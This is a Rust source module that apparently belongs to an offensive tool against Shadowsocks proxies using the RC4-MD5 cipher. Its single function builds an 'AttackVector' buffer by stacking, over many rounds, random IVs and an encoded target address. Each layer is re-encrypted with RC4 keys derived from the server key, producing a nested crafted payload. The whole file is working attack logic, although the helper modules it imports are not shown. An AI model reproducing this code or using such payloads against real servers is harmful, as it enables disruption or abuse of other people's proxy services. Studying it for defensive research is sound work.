use crate::shadowsocks_codec::ShadowsocksCodec;
use crate::shadowsocks_packet::{Rc4Md5IV, Rc4Md5KeyDriver};
use crate::vector_config::AttackVectorConfig;
use rand::thread_rng;

pub struct AttackVector {
    pub buffer: Vec<u8>,
}

impl AttackVector {
    fn estimate_buffer_size(rounds: usize) -> usize {
        rounds * 23
    }
}

impl From<AttackVectorConfig> for AttackVector {
    fn from(config: AttackVectorConfig) -> Self {
        let buffer_size = AttackVector::estimate_buffer_size(config.rounds);
        let mut buffer = vec![0u8; buffer_size];
        let key_driver = Rc4Md5KeyDriver::new(&config.key);
        let mut rng  = thread_rng();

        for step in 1..=config.rounds {
            if step % 100 == 0 {
                eprintln!("round {} of {}", step, config.rounds);
            }

            let iv = Rc4Md5IV::new(&mut rng);
            let mut rc4 = key_driver.derive(&iv.buffer);

            let curr_start = buffer_size - step * 23;
            buffer[curr_start..curr_start + 16].copy_from_slice(&iv.buffer);
            config
                .address
                .encode_shadowsocks(&mut buffer[curr_start + 16..buffer_size]);

            rc4.crypt_inplace(&mut buffer[curr_start + 16..buffer_size]);
        }

        return AttackVector { buffer };
    }
}
